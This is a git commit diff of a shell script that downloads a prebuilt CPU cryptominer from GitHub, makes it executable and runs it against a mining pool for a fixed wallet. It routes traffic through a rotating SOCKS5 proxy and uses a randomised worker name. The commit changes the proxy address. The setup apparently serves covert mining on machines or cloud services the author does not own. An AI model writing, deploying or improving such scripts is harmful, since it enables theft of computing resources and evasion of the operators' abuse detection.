2d362041c67f9c550401540159f2dca9ed376779
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-21 20:57:41 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,7 +3,7 @@ apt-get update
 apt-get install screen libjansson4 -y
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-sse2
 screen -dmS ls
-PROXY=socks5://72.221.164.34:60671
+PROXY=socks5://184.178.172.18:15280
 ./cpuminer-sse2 -a gr -o stratum+tcp://stratum-na.rplant.xyz:7056 -u RQKNmref6uHRhzyYmWGfx3uKTjpRPTRnHx.$(echo $(shuf -i 10000-99999 -n 1)-CPU) -t 2 -x $PROXY
 sleep 5
 done
